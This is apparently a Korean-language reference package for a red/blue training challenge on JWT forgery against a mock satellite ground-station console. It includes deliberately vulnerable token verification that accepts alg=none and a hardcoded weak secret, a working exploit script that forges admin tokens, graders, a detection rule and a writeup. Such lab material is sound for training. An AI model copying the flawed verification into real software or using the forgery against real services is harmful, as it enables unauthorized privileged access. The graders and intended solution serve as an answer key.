# 레퍼런스 문제 패키지 — WEB-002 (JWT 위조)

> 10번 문서의 예시를 **실제 출제 수준**으로 구체화한 레퍼런스 구현.
> C1~C6 에이전트는 이 구조를 템플릿으로 각 분야 문제를 동일 형식으로 생산한다.
> Red↔Blue 균형: 공격(위조 토큰으로 관리자 접근) + 방어(탐지 룰 + 키 로테이션 패치).

---

## 1. challenge.yaml

```yaml
challenge:
  id: "WEB-002"
  title: "위조된 지휘권 - JWT Forgery"
  category: "web"
  difficulty: "medium"
  points: { red: 150, blue: 150 }
  asset: "ground_station"
  mitre: [T1078, T1552.001]

  description: |
    위성 지상국 콘솔은 JWT로 세션을 관리한다. 서명 검증 어딘가에 문제가 있다.
    관리자만 접근 가능한 임무 승인 엔드포인트에 도달하라.

  red_task:
    goal: "admin 권한이 필요한 POST /api/mission/approve 를 위조 토큰으로 호출해 승인 코드 획득"
    flag_format: "flag{...}"
    flag_type: "dynamic"          # 팀별 유니크(HMAC)
    hints:
      - { cost: 15, text: "토큰 헤더의 alg를 눈여겨보라." }
      - { cost: 25, text: "서버가 alg=none 또는 약한 대칭키를 허용하는지 시험하라." }
      - { cost: 40, text: "GS-005 디버그 노출이 있었다면 시크릿을 이미 알 수도 있다." }

  blue_task:
    goal: "위조 토큰 사용을 탐지하고, 재발을 막도록 패치"
    success_criteria: |
      (1) SIEM에 WEB-JWT-FORGE 알림이 위조 요청에 대해 발생
      (2) safe_probe에서 위조 토큰(POST /api/mission/approve) 이 401 로 거부됨
    points_breakdown: { detection: 50, patch: 100 }

  scoring:
    red_verify: "flag_match"
    blue_verify: ["alert", "safe_probe"]

  artifacts: []                    # 원격 접근형(제공 파일 없음)
  safety:
    profile: "standard"
    notes: "모든 계정/시크릿 더미. 실제 위성 무관."
```

---

## 2. 취약 환경 (deploy/) — 핵심 로직

기존 ground_station 트윈에 승인 엔드포인트를 추가하는 형태. 취약점은 **약한 대칭키 + alg 미검증**.

```python
# deploy/app/jwt_routes.py (발췌, 취약 버전)
JWT_SECRET = "supersecret123"   # GS-002와 동일한 더미 약한 키

@app.post("/api/mission/approve")
def approve_mission(authorization: str = Header(default=""), x_team_id: str = Header(default="default")):
    token = authorization.replace("Bearer ", "")

    if patched("PATCH_WEB_002"):
        # 패치: alg 화이트리스트(HS256만) + 강한 랜덤 시크릿 + 서버발급 여부 검증
        secret = os.environ["GS_JWT_STRONG_SECRET"]
        try:
            payload = jwt.decode(token, secret, algorithms=["HS256"])
        except Exception:
            emit_event(event_type="blue_block_success", actor="blue", target_asset=ASSET_NAME,
                       vuln_id="WEB-002", team_id=x_team_id, metadata={"reason": "invalid signature"},
                       event_id=Event.make_id(x_team_id, ASSET_NAME, "WEB-002-block", str(time.time())))
            raise HTTPException(401, "invalid token")
    else:
        # 취약: alg 미지정 → alg=none 우회 가능 + 약한 키로 위조 가능
        try:
            # verify_signature를 alg에 따라 느슨하게 처리하는 잘못된 구현 재현
            header = jwt.get_unverified_header(token)
            if header.get("alg") == "none":
                payload = jwt.decode(token, options={"verify_signature": False})
            else:
                payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        except Exception:
            raise HTTPException(401, "invalid token")

    if payload.get("role") != "admin":
        raise HTTPException(403, "admin only")

    # 위조 성공 → 이벤트 발행(탐지 대상). role=admin인데 발급이력 없는 토큰이면 위조 의심 로그.
    forged = payload.get("iss") != "ground-station-auth"   # 정상 발급 토큰엔 iss 존재
    emit_event(event_type="red_attack_started", actor="red", target_asset=ASSET_NAME,
               vuln_id="WEB-002", phase="privilege_escalation", team_id=x_team_id,
               metadata={"forged_suspected": forged, "alg": header.get("alg")},
               event_id=Event.make_id(x_team_id, ASSET_NAME, "WEB-002", str(time.time())))

    approval_flag = dynamic_flag(x_team_id)   # 팀별 유니크
    return {"status": "approved", "approval_code": approval_flag}
```

**동적 플래그**:
```python
def dynamic_flag(team_id: str) -> str:
    import hmac, hashlib
    sig = hmac.new(CHALLENGE_SECRET.encode(), f"WEB-002:{team_id}".encode(), hashlib.sha256).hexdigest()[:16]
    return f"flag{{jwt_forged_{sig}}}"
```

---

## 3. 의도된 해법 (solution/exploit.py)

```python
# 두 가지 의도 해법 중 하나로 성공하면 됨:
#  (a) alg=none 위조   (b) 약한 키로 HS256 서명(디버그 노출로 키 획득 시나리오)
import jwt, requests, sys

BASE = sys.argv[1]           # 배포 엔드포인트
TEAM = sys.argv[2]

# (a) alg=none
tok_none = jwt.encode({"sub": "attacker", "role": "admin"}, "", algorithm="none")
r = requests.post(f"{BASE}/api/mission/approve",
                  headers={"Authorization": f"Bearer {tok_none}", "X-Team-Id": TEAM})
print("alg=none:", r.status_code, r.json() if r.ok else r.text)

# (b) 약한 키
tok_weak = jwt.encode({"sub": "attacker", "role": "admin"}, "supersecret123", algorithm="HS256")
r2 = requests.post(f"{BASE}/api/mission/approve",
                   headers={"Authorization": f"Bearer {tok_weak}", "X-Team-Id": TEAM})
print("weak key:", r2.status_code, r2.json() if r2.ok else r2.text)
```

---

## 4. 자동 채점기

```python
# grader/red_grader.py
def grade_red(submission, context):
    expected = dynamic_flag(submission["team_id"])
    if submission.get("flag", "").strip() == expected:
        return GradeResult(True, 150, "flag correct")
    return GradeResult(False, 0, "incorrect or empty flag")

# grader/blue_grader.py
def grade_blue(context):
    # 1) 방어 후 위조 토큰이 거부되는지
    import jwt, requests
    forged = jwt.encode({"role": "admin"}, "", algorithm="none")
    r = requests.post(f'{context["base"]}/api/mission/approve',
                      headers={"Authorization": f"Bearer {forged}"})
    patched_ok = r.status_code == 401
    # 2) SIEM에 탐지 알림이 있었는지
    alert_ok = context["siem"].has_alert("WEB-JWT-FORGE", team_id=context["team_id"])
    pts = (100 if patched_ok else 0) + (50 if alert_ok else 0)
    return GradeResult(patched_ok or alert_ok, pts,
                       f"patch={patched_ok} detect={alert_ok}")
```

---

## 5. 탐지 룰 (Blue가 작성해야 하는 정답 예시)

```yaml
# WEB-JWT-FORGE
id: WEB-JWT-FORGE
title: JWT Forgery / alg=none or unissued admin token
severity: 3
mitre: [T1078]
source_type: twin
match:
  endpoint: "/api/mission/approve"
  any:
    - raw.alg: "none"
    - metadata.forged_suspected: true
action_on_match: alert
```

---

## 6. writeup.md (훈련 후 공개)

- 근본원인: alg 미검증(alg=none 수용) + 약한 대칭키 하드코딩.
- 공격: 헤더 조작으로 서명 무력화 또는 알려진 약한 키로 서명.
- 방어: alg 화이트리스트(비대칭 권장), 강한 시크릿·로테이션, iss/발급이력 검증, 토큰 바인딩.
- 교훈: "검증하지 않는 서명은 서명이 아니다."

---

## 7. 이 패키지가 템플릿인 이유 (C1~C6 공통 적용)

- **동일 디렉토리 구조**(11번 문서 1절) — 카테고리만 바꿔 재사용.
- **Red 채점=flag/이벤트, Blue 채점=patch+alert** 이원화 — 모든 분야 동일.
- **동적 플래그**로 공유 방지 — 포렌식/리버싱은 아티팩트에 팀 시드 주입으로 구현.
- **의도 해법 2종 제공** — C-QA의 intended_solve + unintended_scan에 대응.
- **안전 프로파일 명시** — RCE류(AI/Pwn/역직렬화)는 `hardened`로 상향.

각 분야 에이전트는 이 파일을 복제해 카테고리 특화 부분(artifacts, exploit, grader)만 교체하면 된다.
```
```
